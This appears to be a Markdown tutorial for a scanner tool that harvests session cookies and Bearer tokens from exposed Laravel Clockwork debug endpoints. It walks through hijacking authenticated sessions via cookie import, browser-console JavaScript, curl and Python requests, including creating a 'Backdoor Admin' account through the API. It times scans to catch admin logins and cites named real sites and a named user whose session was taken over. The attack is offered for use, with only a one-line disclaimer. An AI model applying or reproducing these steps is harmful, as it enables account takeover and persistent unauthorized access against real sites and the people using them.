# Laravel Clockwork Exploitation Tutorial

## 🎯 Complete Guide to Cookie Hijacking & Bearer Token Authentication

This guide covers how to use cookies and Bearer tokens extracted from Laravel Clockwork exposures to hijack authenticated sessions.

---

## Table of Contents

1. [Understanding Authentication Types](#understanding-authentication-types)
2. [Cookie Hijacking Tutorial](#cookie-hijacking-tutorial)
3. [Bearer Token Tutorial](#bearer-token-tutorial)
4. [Troubleshooting](#troubleshooting)

---

## Understanding Authentication Types

### 🍪 Session Cookies (Browser Login)

**What are they?**
- `laravel_session` - Main authentication cookie
- `XSRF-TOKEN` - CSRF protection token
- Used for traditional web applications
- Automatically sent by browser on every request

**When to use:**
- Sites with web-based login (admin panels, dashboards)
- Traditional Laravel applications
- When scanner creates `cookies_cookie-editor.json`

**Session Types:**
- 🔴 **GUEST** - No one logged in (useless)
- 🟡 **USER** - Regular authenticated user
- 🔥 **ADMIN** - Administrator access (jackpot!)

---

### 🔑 Bearer Tokens (API Authentication)

**What are they?**
- JWT (JSON Web Token) or Laravel Sanctum tokens
- Used in API requests via `Authorization` header
- Not stored as cookies
- Common in modern SPAs (Single Page Apps) and mobile apps

**When to use:**
- API-based applications
- Sites with `/api/` endpoints
- When scanner creates `bearer_tokens.txt`
- Modern React/Vue/Angular frontends

---

## Cookie Hijacking Tutorial

### Step 1: Extract Cookies with Scanner

```bash
# Scan single target
echo "https://target.com" > single.txt
python main.py
# Select option 1 (Single Target)

# Or scan multiple targets
python main.py
# Select option 2 (Bulk Scan)
```

### Step 2: Check Results

Navigate to `Results/target.com/`:

```bash
cd Results/target.com/
ls
```

**Files created:**
- ✅ `cookies_cookie-editor.json` - Import-ready cookie file (ADMIN/USER only)
- ✅ `cookies.txt` - Human-readable cookie list
- ✅ `exposed_urls.txt` - All vulnerable endpoints
- ✅ `response_*.txt` - Raw Clockwork data

**If NO cookie files:**
- Only GUEST sessions found
- Cookies not worth saving
- Try again during business hours

### Step 3: Check Session Type

Open `cookies.txt`:

```
COOKIES EXTRACTED FROM target.com
============================================================

SESSION TYPE: ADMIN          <--- Look here!
User: John Admin
Email: admin@target.com

============================================================
```

**Session Types:**
- 🔥 **ADMIN** - Full admin access (best!)
- 🟢 **USER** - Regular user access (still useful)
- 🔴 **GUEST** - Not authenticated (scanner skips these)

### Step 4: Import Cookies to Browser

#### Method A: Cookie Editor Extension (Recommended)

1. **Install Cookie Editor:**
   - Chrome: https://chrome.google.com/webstore (search "Cookie Editor")
   - Firefox: https://addons.mozilla.org (search "Cookie Editor")

2. **Import Cookies:**
   - Open target website in browser: `https://target.com`
   - Click Cookie Editor icon in toolbar
   - Click **Import** button
   - Select `cookies_cookie-editor.json`
   - Click **Import** to confirm

3. **Verify Login:**
   - Refresh the page (F5)
   - You should now be logged in!
   - Check top-right corner for username

#### Method B: Manual Import (Cookie Editor)

1. Open Cookie Editor on target site
2. Click **Add Cookie** (the + button)
3. Fill in details from `cookies.txt`:

```
Name: laravel_session
Value: eyJpdiI6IjZRUlR4ZUQ2Z1RJcld4cTVlcHRqaGc9PSIsInZhbH...
Domain: target.com
Path: /
Secure: ✓ (if HTTPS)
HttpOnly: ✓
```

4. Add XSRF-TOKEN cookie the same way
5. Refresh page

#### Method C: Browser Console (Advanced)

1. Open Developer Console (F12)
2. Go to **Console** tab
3. Paste this code (replace values from `cookies.txt`):

```javascript
document.cookie = "laravel_session=YOUR_SESSION_VALUE; domain=target.com; path=/; secure; samesite=lax";
document.cookie = "XSRF-TOKEN=YOUR_XSRF_VALUE; domain=target.com; path=/";
location.reload();
```

4. Press Enter - page will reload and you're logged in!

### Step 5: Access the Site

After importing cookies:

```
1. Refresh the page (F5 or Ctrl+R)
2. Check if you're logged in (look for username/logout button)
3. Navigate to admin panel (usually /admin, /dashboard, /panel)
4. You now have full access as the hijacked user!
```

**Common Admin URLs:**
- `https://target.com/admin`
- `https://target.com/dashboard`
- `https://target.com/panel`
- `https://target.com/administrator`
- `https://target.com/backend`

---

## Bearer Token Tutorial

### Step 1: Extract Bearer Token

```bash
python main.py
# Scanner automatically extracts tokens if found
```

Check `Results/target.com/bearer_tokens.txt`:

```
============================================================
  BEARER TOKENS (API Authentication)
============================================================

Token #1 - SESSION: ADMIN
⚠️  ADMIN TOKEN! ⚠️
User: Admin User
Email: admin@target.com

Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImFmZTQ1MDc4...

cURL Examples (Find real endpoints via Clockwork):
curl "https://target.com/api/user" -H "Authorization: Bearer eyJ0..."
curl "https://target.com/api/admin/dashboard" -H "Authorization: Bearer eyJ0..."
```

### Step 2: Find API Endpoints

1. **Check Clockwork data:**
   - Open `https://target.com/__clockwork/latest`
   - Look for `"uri"` field - these are real endpoints
   - Example: `"uri": "/api/admin/users"`

2. **Common Laravel API endpoints:**
   - `/api/user` - Current user info
   - `/api/users` - List users
   - `/api/admin/*` - Admin endpoints
   - `/api/dashboard` - Dashboard data

### Step 3: Use Bearer Token

#### Method A: cURL (Command Line)

```bash
# Test authentication
curl "https://target.com/api/user" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"

# Get admin data
curl "https://target.com/api/admin/dashboard" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"

# POST request (create new admin)
curl "https://target.com/api/admin/users" \
  -X POST \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@evil.com","password":"password123","role":"admin"}'
```

#### Method B: ModHeader Extension (Browser)

1. **Install ModHeader:**
   - Chrome/Firefox: Search "ModHeader" in extension store

2. **Configure Header:**
   - Open ModHeader extension
   - Click **+** to add request header
   - **Name:** `Authorization`
   - **Value:** `Bearer YOUR_TOKEN_HERE`
   - Toggle **ON**

3. **Browse API:**
   - Visit `https://target.com/api/user` in browser
   - You'll see JSON response (authenticated!)
   - Navigate to any API endpoint

4. **Toggle off** when done to avoid breaking other sites

#### Method C: Postman (API Testing)

1. Open Postman
2. Create new request:
   - Method: **GET**
   - URL: `https://target.com/api/user`
3. Go to **Headers** tab
4. Add header:
   - Key: `Authorization`
   - Value: `Bearer YOUR_TOKEN_HERE`
5. Click **Send**

#### Method D: Python Script

```python
import requests

TOKEN = "YOUR_TOKEN_HERE"
BASE_URL = "https://target.com"

headers = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# Get current user
response = requests.get(f"{BASE_URL}/api/user", headers=headers)
print(response.json())

# Get all users (admin endpoint)
response = requests.get(f"{BASE_URL}/api/admin/users", headers=headers)
print(response.json())

# Create new admin
data = {
    "name": "Backdoor Admin",
    "email": "backdoor@evil.com",
    "password": "secret123",
    "role": "admin"
}
response = requests.post(f"{BASE_URL}/api/admin/users", headers=headers, json=data)
print(response.json())
```

---

## Troubleshooting

### ❌ Cookies Don't Work (Not Logged In)

**1. Check Session Type**
```bash
cat Results/target.com/cookies.txt | head -n 10
```
- If says **GUEST** - Scanner skipped saving (no authenticated cookies found)
- If no cookie files exist - Only guest sessions available

**2. Cookie Expired**
- Laravel sessions typically expire in 2 hours (default: 120 minutes)
- Re-scan the target to get fresh cookies
- Try during business hours for better results

**3. Domain Mismatch**
- Cookie domain must match target
- `admin.target.com` cookies won't work on `app.target.com`
- Check domain in `cookies.txt` matches URL you're visiting

**4. Wrong Subdomain**
- Scanner saves cookies for BOTH domains if found
- Example: `app.pulauindahjaya.com` AND `admin.pulauindahjaya.com`
- Import cookies matching your target subdomain

**5. httpOnly Flag**
- Some cookies can't be set via JavaScript (Console method)
- Use Cookie Editor extension instead

**6. Browser Cache**
- Clear browser cache/cookies first
- Open Incognito/Private window
- Import cookies in clean session

**7. IP/User-Agent Validation**
- Some sites validate IP address or User-Agent
- Try using same IP/proxy location as original user
- Match User-Agent string from Clockwork data

### ❌ Bearer Token Returns 401/403

**1. Token Expired**
- JWT tokens have expiration (`exp` claim)
- Re-scan target to get fresh token
- Some tokens expire in minutes, others in months

**2. Wrong Endpoint**
- `/api/user` might not exist (returns 404)
- Check Clockwork `uri` field for real endpoints
- Try `/api/me`, `/api/v1/user`, etc.

**3. Token Format**
- Ensure you include `Bearer ` prefix (with space!)
- Correct: `Authorization: Bearer eyJ0eXAi...`
- Wrong: `Authorization: eyJ0eXAi...`

**4. API Version**
- Try different API versions: `/api/v1/user`, `/api/v2/user`

### ❌ No Cookie/Token Files Created

**Reason:**
- Only GUEST sessions found in 2000 requests
- No authenticated users accessed the site recently

**Solutions:**

1. **Wait for Business Hours:**
   - Scan during working hours (9 AM - 5 PM target timezone)
   - Higher chance of catching active admin sessions

2. **Enumerate More:**
   - Use `enumerate_requests.py` for manual deep dive:
   ```bash
   python enumerate_requests.py https://target.com 5000
   ```

3. **Check Multiple Times:**
   - Scan hourly during the day
   - Admins might login later

4. **Try /__clockwork/app:**
   - Access `https://target.com/__clockwork/app` in browser
   - Browse requests manually
   - Look for `authenticatedUser` not null

---

## Real World Examples

### Example 1: Cookie Hijacking (pulauindahjaya.com)

**Scanner Output:**
```
[+] Clockwork exposed: https://app.pulauindahjaya.com/__clockwork/latest
[*] Enumerating 500 previous requests (hunting admin sessions)...
[!] Found 45 USER session(s) in previous requests!
[+] Extracted USER cookies: MUHAMMAD DIMAS SAID
[SESSION] USER - Authenticated
```

**Result:**
- File created: `Results/pulauindahjaya.com/cookies_cookie-editor.json`
- Imported to Cookie Editor
- Logged in as "MUHAMMAD DIMAS SAID"
- Access to both `app.pulauindahjaya.com` AND `admin.pulauindahjaya.com`

### Example 2: Bearer Token (api.slurpstaging.getslurp.com)

**Scanner Output:**
```
[!] Found Bearer token for API authentication!
[SESSION] ADMIN - JWT Token with admin:central scope
```

**Result:**
- File created: `Results/api.slurpstaging.getslurp.com/bearer_tokens.txt`
- Used cURL to access admin APIs
- Token has `admin:central` scope (full access)

---

## Quick Reference Commands

```bash
# 1. Scan single target
echo "https://target.com" > single.txt
python main.py  # Select option 1

# 2. Check if cookies found
ls Results/target.com/cookies*.json

# 3. Check session type
cat Results/target.com/cookies.txt | head

# 4. Manual enumeration (if no cookies)
python enumerate_requests.py https://target.com 1000

# 5. Test Bearer token
curl "https://target.com/api/user" -H "Authorization: Bearer TOKEN"
```

---

## Pro Tips

1. **Timing Matters:**
   - Scan during business hours for best results
   - Admins are more active 9 AM - 5 PM

2. **Multiple Scans:**
   - Re-scan periodically to catch new sessions
   - Cookies expire (usually 2 hours)

3. **Check Both Domains:**
   - Scanner saves cookies for ALL subdomains found
   - `app.site.com` vs `admin.site.com` - try both!

4. **Bearer Tokens > Cookies for APIs:**
   - If site has `/api/` endpoints, Bearer tokens more useful
   - Tokens often have longer expiration

5. **Manual Inspection:**
   - Check `response_*.txt` files for raw data
   - Look for additional info (user roles, permissions, etc.)

6. **Combine Methods:**
   - Use cookies for web access
   - Use Bearer tokens for API manipulation
   - Create backdoor admin via API!

---

## Summary

**Cookie Hijacking = Browser Login:**
1. Scanner extracts `laravel_session` + `XSRF-TOKEN`
2. Import via Cookie Editor extension
3. Refresh page → Logged in!

**Bearer Token = API Access:**
1. Scanner extracts JWT token
2. Use in `Authorization: Bearer` header
3. Access API endpoints via cURL/Postman/ModHeader

**Both methods give you full authenticated access to the application!** 🎯

---

## Additional Resources

- `README.md` - Scanner usage and features
- `QUICK_START.md` - Fast getting started guide
- `TROUBLESHOOTING_COOKIE_HIJACKING.md` - Detailed troubleshooting
- `HOW_TO_IDENTIFY_ADMIN_COOKIES.md` - Distinguish ADMIN vs USER
- `BEARER_TOKEN_GUIDE.md` - Bearer token deep dive

## ⚠️ Legal Disclaimer
For authorized penetration testing & educational purposes only (user confirmed permission under ToS). Unauthorized use illegal/unethical.

## 👨‍💻 Author
[Bob Marley](https://github.com/khadafigans)

Buy me a Coffee:
```
₿ BTC: 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh
```

©2025 khadafigans
